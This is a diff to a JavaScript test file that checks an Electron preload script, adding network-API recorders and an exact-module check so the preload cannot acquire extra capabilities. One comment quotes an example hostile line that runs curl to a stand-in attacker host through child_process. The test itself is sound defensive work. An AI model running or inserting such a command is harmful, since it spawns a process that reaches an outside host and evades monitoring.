@@ -348,7 +348,8 @@ ok(bridge.outboundDoors.includes('__runnerCanaryDoor'),
   `outboundDoors came back as ${JSON.stringify(bridge.outboundDoors)}, without the canary door the `
   + 'runner installs for the probe. That list was not probed, so it describes nothing.');
 assert.deepStrictEqual(bridge.outboundDoors.filter((d) => d !== '__runnerCanaryDoor').sort(),
-  ['XMLHttpRequest', 'WebSocket', 'fetch', 'sendBeacon'].sort(),
+  ['XMLHttpRequest', 'WebSocket', 'fetch', 'sendBeacon', 'EventSource', 'Image',
+    'RTCPeerConnection'].sort(),
   `the bridge runner offered the preload ${JSON.stringify(bridge.outboundDoors)}. A door it does `
   + 'not provide is a door the preload cannot be caught using: the call throws, a beacon\'s '
   + 'try/catch swallows it, and the empty preloadNetworkCalls above means nothing.');
@@ -366,6 +367,34 @@ checks++;
 //
 // The runner drives each door with a known URL before loading the preload and
 // reports whether the call landed, then rolls the arrays back.
+// WHAT THE PRELOAD REQUIRES — exactly 'electron', nothing else.
+//
+// The outbound-door checks above cover renderer APIs. They cannot see
+// `require('child_process').exec('curl https://evil.example')`, which is a
+// different and worse door: child_process is REAL under Node, so unlike
+// EventSource or Image the call actually runs, and it escapes every network
+// stub by spawning a process. It passed all 437 checks — the runner's
+// Module._load hook saw the require and discarded it, because only
+// electron-main.cjs's requires were being recorded.
+//
+// A preload that bridges one IPC channel needs one module. Anything else —
+// child_process, fs, net, http, an npm package — is a capability the renderer
+// side should not be acquiring, so the list is exact rather than a denylist of
+// module names I happened to think of.
+// The preload's own entry path is the canary here: Module._load sees it first,
+// so a real list always carries it and a hardcoded ['electron'] does not.
+ok(bridge.preloadRequires.some((m) => m.endsWith('electron-preload.cjs')),
+  `preloadRequires came back as ${JSON.stringify(bridge.preloadRequires)}, without the preload's `
+  + 'own entry path that Module._load always sees first. That list was fabricated, not recorded.');
+assert.deepStrictEqual(
+  bridge.preloadRequires.filter((m) => !m.endsWith('electron-preload.cjs')),
+  ['electron'],
+  `electron-preload.cjs required ${JSON.stringify(bridge.preloadRequires)}. It bridges one IPC `
+  + 'channel and needs exactly one module; anything else is a capability acquired inside the '
+  + 'renderer\'s own process, and child_process in particular escapes every network stub in this '
+  + 'file by spawning a process.');
+checks++;
+
 // WHAT THIS DOES NOT COVER, stated rather than left to be discovered. The
 // canaries defeat a runner field that was hardcoded to its expected EMPTY
 // value — the realistic way these rot, since every verdict here is "the list
@@ -375,7 +404,8 @@ checks++;
 // is a code-review problem and not one a self-test inside the same file can
 // solve; chasing it further would only move the same knowledge one level up.
 assert.deepStrictEqual(bridge.recorderSelfTest,
-  { fetch: true, XMLHttpRequest: true, sendBeacon: true, timerCensus: true },
+  { fetch: true, XMLHttpRequest: true, sendBeacon: true, EventSource: true, Image: true,
+    RTCPeerConnection: true, timerCensus: true },
   `the bridge runner's own recorders failed their self-test `
   + `(${JSON.stringify(bridge.recorderSelfTest)}). A recorder that does not record makes every `
   + '"the preload dialled nothing" verdict above vacuous — they would all still pass on a preload '
